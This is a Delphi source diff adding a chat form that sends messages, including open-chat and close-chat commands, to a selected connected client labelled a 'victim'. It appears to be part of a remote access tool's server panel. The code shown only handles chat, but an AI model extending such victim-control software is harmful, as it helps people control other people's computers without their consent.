@@ -1,0 +1,101 @@
+unit FrmChat;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls;
+
+type
+  TForm3 = class(TForm)
+    PageControl1: TPageControl;
+    Setup: TTabSheet;
+    Chat: TTabSheet;
+    GroupBox1: TGroupBox;
+    Edit1: TEdit;
+    GroupBox2: TGroupBox;
+    Edit2: TEdit;
+    GroupBox3: TGroupBox;
+    CheckBox1: TCheckBox;
+    CheckBox2: TCheckBox;
+    CheckBox3: TCheckBox;
+    Button1: TButton;
+    Memo1: TMemo;
+    GroupBox4: TGroupBox;
+    Edit3: TEdit;
+    GroupBox5: TGroupBox;
+    Edit4: TEdit;
+    Memo2: TMemo;
+    procedure Button1Click(Sender: TObject);
+    procedure Edit4KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
+  private
+    { Private declarations }
+  public
+    ThisFormsVictimID: string;
+  end;
+
+var
+  Form3: TForm3;
+
+implementation
+
+{$R *.dfm}
+
+uses FrmMain;
+
+procedure SendToSelectedClient(const VictimID, Msg: string);
+var
+  I: Integer;
+  NickName: string;
+  UserData: TConnectedUserData;
+begin
+  NickName := VictimID;
+  for I := 0 to Form1.ConnectedUsers.Count - 1 do
+  begin
+    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
+    if UserData.ID = NickName then
+    begin
+      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
+      Exit;
+    end;
+  end;
+end;
+
+procedure TForm3.Button1Click(Sender: TObject);
+var
+  CheckboxStates: string;
+begin
+
+  Edit3.Text := Edit1.Text;
+  Memo1.Lines.Add(Memo2.Text);
+  PageControl1.ActivePageIndex := 1;
+  CheckboxStates := BoolToStr(CheckBox1.Checked, True) + '|' +
+    BoolToStr(CheckBox2.Checked, True) + '|' +
+    BoolToStr(CheckBox3.Checked, True);
+  SendToSelectedClient(ThisFormsVictimID, 'Chat|' + Edit2.Text + '|' +
+    Memo2.Text + '|' + CheckboxStates);
+end;
+
+procedure TForm3.Edit4KeyDown(Sender: TObject; var Key: Word;
+  Shift: TShiftState);
+begin
+  if Key = VK_RETURN then // VK_RETURN is the Enter key
+  begin
+    Key := 0;
+    Edit4.SetFocus;
+
+    SendToSelectedClient(ThisFormsVictimID, 'ChatMsg|' + Edit3.Text + '|' +
+      Edit4.Text);
+    Memo1.Lines.Add(Edit3.Text + ' Said: ' + Edit4.Text);
+    Edit4.clear;
+  end;
+end;
+
+procedure TForm3.FormClose(Sender: TObject; var Action: TCloseAction);
+begin
+  SendToSelectedClient(ThisFormsVictimID, 'CloseChat|');
+end;
+
+end.
